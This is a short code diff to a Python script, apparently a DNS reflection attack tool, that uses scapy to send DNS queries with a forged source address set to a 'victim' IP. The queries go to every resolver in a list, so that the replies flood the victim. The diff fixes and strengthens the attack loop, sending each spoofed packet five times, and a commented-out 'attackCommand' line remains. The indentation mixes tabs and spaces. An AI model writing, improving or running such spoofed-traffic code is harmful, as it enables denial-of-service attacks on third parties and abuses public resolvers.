@@ -6,7 +6,7 @@ import subprocess
 import os
 from rich.console import Console
 from time import sleep
-
+from scapy.all import *
 def subprocess_call_commands(command):
     os.system(command)
 
@@ -33,8 +33,10 @@ def main(api_key: str,victim:str,targeted_domain:str):
         with open('DNS-Resolvers.txt') as f:
             contents = f.readlines()
             for ip in contents:
-            	dns = IP(src=victim,dst=ip)/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname=targeted_domain))
-		answer = sr1(dns,verbose=0)
+            	dns = IP(src=victim,dst=ip.strip())/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname=targeted_domain))
+            	sent = send(dns,count=5,return_packets=True)
+            	print(sent.summary())
+  
                 #attackCommand = "dig " + victim + " " + i + "> /dev/null 2>&1"
                 #subprocess_call_commands(attackCommand)
     
